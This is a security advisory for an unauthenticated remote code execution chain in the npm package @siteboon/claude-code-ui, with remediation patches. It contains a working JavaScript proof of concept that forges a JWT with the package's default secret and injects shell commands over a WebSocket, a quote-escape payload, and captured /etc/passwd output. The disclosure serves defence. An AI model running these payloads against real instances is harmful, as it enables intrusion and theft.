# [H] @siteboon/claude-code-ui Vulnerable to Unauthenticated RCE via WebSocket Shell Injection

## Summary
Severity: High
Advisory: GHSA-gv8f-wpm2-m5wr
CVE: CVE-2026-31975
CWE: CWE-1188, CWE-287, CWE-78
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-11
Source: https://github.com/advisories/GHSA-gv8f-wpm2-m5wr
Type: github-advisory

## Affected
- npm: `@siteboon/claude-code-ui` — affected >=0 <1.25.0

## Details
# Security Advisory: Insecure Default JWT Secret + WebSocket Auth Bypass Enables Unauthenticated RCE via Shell Injection
Download: [cve_claudecodeui_submission_v2.zip](https://github.com/user-attachments/files/25686652/cve_claudecodeui_submission_v2.zip)

##  Submission Info

| Field | Value |
|-------|-------|
| **Package** | `@siteboon/claude-code-ui` |
| **Ecosystem** | npm |
| **Affected versions** | `<= 1.24.0` (latest) |
| **Severity** | Critical |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE** | CWE-1188, CWE-287, CWE-78 |
| **Reported** | 2026-03-02 |
| **Researcher** | Ethan-Yang (OPCIA) |

---

## Summary

Three chained vulnerabilities allow **unauthenticated remote code execution** on any
claudecodeui instance running with default configuration. No account, credentials, or
prior access is required.

The root cause of RCE is **OS command injection (CWE-78)** in the WebSocket shell
handler. Authentication is bypassed by combining an insecure default JWT secret
**(CWE-1188)** with a WebSocket authentication function that skips database user
validation **(CWE-287)**.

---

## Vulnerability Details

### 1. Insecure Default JWT Secret — `CWE-1188`

**File**: `server/middleware/auth.js`, line 6

```javascript
const JWT_SECRET = process.env.JWT_SECRET || 'claude-ui-dev-secret-change-in-production';
```

The server uses an environment variable for `JWT_SECRET`, but falls back to a
well-known default value when the variable is not set. Critically, `JWT_SECRET` is
**not included in `.env.example`**, so the majority of users deploy without setting it,
leaving the fallback value in effect.

Since this default string is published verbatim in the public source code, any attacker
can use it to sign arbitrary JWT tokens.

---

### 2. WebSocket Authentication Skips Database Validation — `CWE-287`

**File**: `server/middleware/auth.js`, lines 82–108

`authenticateWebSocket()` only verifies the JWT **signature**. It does **not** check
whether the `userId` in the payload actually exists in the database — unlike
`authenticateToken()` which is used for REST endpoints and does perform this check:

```javascript
// authenticateWebSocket() — VULNERABLE
const decoded = jwt.verify(token, JWT_SECRET);
return decoded;  // ← userId never verified against DB

// authenticateToken() — CORRECT (REST endpoints)
const decoded = jwt.verify(token, JWT_SECRET);
const user = userDb.getUserById(decoded.userId);  // ← DB check present
if (!user) return res.status(401)...
```

A forged token with a non-existent `userId` passes WebSocket authentication,
bypassing access control entirely.

---

### 3. OS Command Injection via WebSocket Shell — `CWE-78`

**File**: `server/index.js`, line 1179

```javascript

shellCommand = `cd "${projectPath}" && ${initialCommand}`;
```

Both `projectPath` and `initialCommand` are taken directly from the WebSocket message
payload and interpolated into a bash command string without any sanitization,
enabling arbitrary OS command execution.

A secondary injection vector exists at line 1257 via unsanitized `sessionId`:

```javascript
shellCommand = `cd "${projectPath}" && claude --resume ${sessionId} || claude`;
```

---

## Proof of Concept

**Requirements**: Node.js, `jsonwebtoken`, `ws`

```javascript
import jwt from 'jsonwebtoken';
import WebSocket from 'ws';

// Step 1: Sign a token with the publicly known default secret
const token = jwt.sign(
  { userId: 1337, username: 'attacker' },
  'claude-ui-dev-secret-change-in-production'
);

// Step 2: Connect to /shell WebSocket — auth passes because
//         authenticateWebSocket() does not verify userId in DB
const ws = new WebSocket(`ws://TARGET_HOST:3001/shell?token=${token}`);

ws.on('open', () => {
  // Step 3: initialCommand is injected directly into bash
  ws.send(JSON.stringify({
    type: 'init',
    projectPath: '/tmp',
    initialCommand: 'id && cat /etc/passwd',
    isPlainShell: true,
    hasSession: false
  }));
});

ws.on('message', (data) => {
  const msg = JSON.parse(data);
  if (msg.type === 'output') process.stdout.write(msg.data);
});
```

**Actual output observed during testing:**
```
uid=1001(user) gid=1001(user) groups=1001(user),27(sudo)
ubuntu
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

### Secondary vector — `projectPath` double-quote escape injection

```javascript
ws.send(JSON.stringify({
  type: 'init',
  projectPath: '" && id && echo "pwned" # ',
  provider: 'claude',
  hasSession: false
}));
// Server executes: cd "" && id && echo "pwned" # " && claude
// Output: uid=1001... / pwned
```

---

## Additional Findings

| CWE | Location | Description |
|-----|----------|-------------|
| CWE-306 | `server/routes/auth.js:22` | `/api/auth/register` requires no authentication — first caller becomes admin |
| CWE-942 | `server/index.js:325` | `cors()` with no options sets `Access-Control-Allow-Origin: *` |
| CWE-613 | `server/middleware/auth.js:70` | `generateToken()` sets no `expiresIn` — tokens never expire |

---

## Impact

Any claudecodeui instance accessible over the network where `JWT_SECRET` is not
explicitly configured (the default case, as it is absent from `.env.example`) is
vulnerable to:

- **Full OS command execution** as the server process user
- **File system read/write** access
- **Credential theft** (SSH keys, `.env` files, API keys stored on the host)
- **Lateral movement** within the host network

The attack requires **zero authentication** and succeeds immediately after
default installation.

---

## Remediation

### Fix 1 — Enforce explicit JWT_SECRET; remove insecure default
```javascript
// server/middleware/auth.js
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) {
  console.error('[FATAL] JWT_SECRET environment variable must be set');
  process.exit(1);
}
```
Also add `JWT_SECRET=` to `.env.example` with a clear instruction to set a strong random value.

### Fix 2 — Add DB user existence check in WebSocket authentication
```javascript
const authenticateWebSocket = (token) => {
  if (!token) return null;
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = userDb.getUserById(decoded.userId); // ← add
    if (!user) return null;                          // ← add
    return user;
  } catch (error) {
    return null;
  }
};
```

### Fix 3 — Replace shell string interpolation with spawn argument array
```javascript
// Instead of:
const shellProcess = pty.spawn('bash', ['-c', `cd "${projectPath}" && ${initialCommand}`], ...);

// Use:
const shellProcess = pty.spawn(initialCommand.split(' ')[0], initialCommand.split(' ').slice(1), {
  cwd: projectPath  // pass path as cwd, not shell string
});
```

### Fix 4 — Additional hardening
- Add `expiresIn: '24h'` to `generateToken()`
- Restrict CORS to specific trusted origins
- Rate-limit and restrict `/api/auth/register` to localhost on initial setup

---

## Timeline

| Date | Event |
|------|-------|
| 2026-03-02 | Vulnerabilities discovered and verified via PoC |
| 2026-03-02 | Private advisory submitted to maintainer |
| 2026-06-01 | Public disclosure (90-day deadline) |

---

## Researcher

**Ethan-Yang** — OPCIA

## References
- https://github.com/siteboon/claudecodeui/security/advisories/GHSA-gv8f-wpm2-m5wr
- https://nvd.nist.gov/vuln/detail/CVE-2026-31975
- https://github.com/siteboon/claudecodeui/commit/12e7f074d9563b3264caf9cec6e1b701c301af26
- https://github.com/siteboon/claudecodeui
- https://github.com/siteboon/claudecodeui/releases/tag/v1.25.0
